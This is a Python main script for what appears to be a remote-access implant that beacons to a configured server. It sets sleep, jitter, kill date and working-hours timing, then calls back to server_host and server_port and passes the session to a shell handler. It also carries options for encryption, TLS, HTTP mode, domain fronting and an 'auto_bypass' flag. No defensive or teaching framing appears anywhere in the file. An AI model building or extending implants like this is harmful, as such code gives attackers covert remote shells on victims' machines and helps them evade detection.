import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from client.core.config import load_config
from client.core.connection import connect_and_run
from client.core.dispatcher import handle_session
from client.platform import get_platform


def main():
    config = load_config()
    platform = get_platform()

    beacon_config = None
    if config.get('beacon'):
        from client.core.beacon import BeaconConfig
        beacon_config = BeaconConfig(
            sleep_time=config.get('beacon_sleep', 5.0),
            jitter=config.get('beacon_jitter', 0.3),
            kill_date=config.get('kill_date'),
            working_hours=config.get('working_hours'),
        )

    def shell_callback(sock_or_proto, encryption, tls, http_mode):
        handle_session(sock_or_proto, platform, encryption, tls,
                       config['auto_bypass'], http_mode)

    try:
        connect_and_run(
            config['server_host'],
            config['server_port'],
            shell_callback,
            config['reconnect_interval'],
            config['encryption'],
            config['tls'],
            config.get('http_mode', False),
            config.get('front_host'),
            beacon_config=beacon_config,
        )
    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    main()
